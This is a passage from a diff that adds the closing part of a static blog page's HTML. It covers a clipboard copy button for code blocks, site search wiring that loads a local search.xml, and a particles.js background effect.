+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+  
+<script src="/js/search.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+
+    var $inputArea = $("input#search-input");
+    var $resultArea = document.querySelector("div#search-result");
+
+    $inputArea.focus(function() {
+      var search_path = "search.xml";
+      if (search_path.length == 0) {
+        search_path = "search.xml";
+      }
+      var path = "/" + search_path;
+      searchFunc(path, 'search-input', 'search-result');
+    });
+
+    $inputArea.keydown(function(e) {
+      if (e.which == 13) {
+        e.preventDefault();
+      }
+    });
+
+    var observer = new MutationObserver(function(mutationsList, observer) {
+      if (mutationsList.length == 1) {
+        if (mutationsList[0].addedNodes.length) {
+          $(".search-no-result").hide();
+        } else if (mutationsList[0].removedNodes.length) {
+          $(".search-no-result").show(200);
+        }
+      }
+    });
+
+    observer.observe($resultArea, { childList: true });
+
+  });
+  </script>
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- particles -->
+
+<script src="/lib/particles/particles.min.js"></script>
+
+<script type="text/javascript">
+ 
+      
+</script>
+
+    <div id="particles-js"></div>
+</body>
+</html>
